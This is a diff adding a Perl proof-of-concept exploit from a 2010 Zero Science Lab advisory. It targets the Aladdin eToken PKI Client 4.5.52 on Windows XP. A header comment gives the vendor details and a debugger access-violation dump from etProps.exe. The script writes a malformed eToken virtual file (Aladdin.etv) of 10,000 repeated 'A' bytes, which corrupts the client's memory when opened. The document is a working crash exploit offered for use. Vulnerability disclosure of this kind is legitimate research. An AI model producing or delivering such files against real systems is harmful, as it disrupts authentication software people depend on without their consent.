@@ -1,0 +1,62 @@
+#!/usr/bin/perl -w
+#
+# Title: Aladdin eToken PKI Client v4.5 Virtual File Handling Unspecified Memory Corruption PoC
+#
+#
+#
+# Summary: The eToken PKI Client is the software that enables eToken USB operation and the
+# implementation of eToken PKI-based solutions. These solutions include certificate-based
+# strong two-factor authentication, encryption and digital signing. With the PKI Client your
+# PKI solutions become highly secure, extremely convenient and portable, as you can easily and
+# securely generate and store PKI keys on-board eToken smart card-based devices.
+#
+# Vendor: Aladdin Knowledge Systems Ltd.
+# Product web page: http://www.aladdin.com
+#
+# Version tested: 4.5.52
+# Tested on Microsoft Windows XP Professional SP3 (EN)
+#
+#
+#
+# ===================================================================================
+#
+# (154c.a74): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=00000000 ebx=00000000 ecx=00000000 edx=01730002 esi=00000000 edi=0012fc90
+# eip=0045d3d3 esp=001282b0 ebp=00128304 iopl=0         nv up ei pl nz na po nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+# *** ERROR: Module load completed but symbols could not be loaded for etProps.exe
+# etProps+0x5d3d3:
+# 0045d3d3 8b8ea4000000    mov     ecx,dword ptr [esi+0A4h] ds:0023:000000a4=????????
+#
+# ===================================================================================
+#
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#
+# Zero Science Lab - http://www.zeroscience.mk
+#
+# liquidworm gmail com
+#
+# 11.04.2010
+#
+# Advisory: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4933.php
+#
+
+
+$fajl = "Aladdin.etv"; # eToken Virtual file
+
+$djubre = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+	  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
+
+open etv, ">./$fajl" || die "\nCan't open $fajl: $!";
+print etv $djubre x 100;
+print "\n [o] Writing to file...\n";
+sleep 1;
+close etv;
+print "\n [o] File $fajl created.\n";
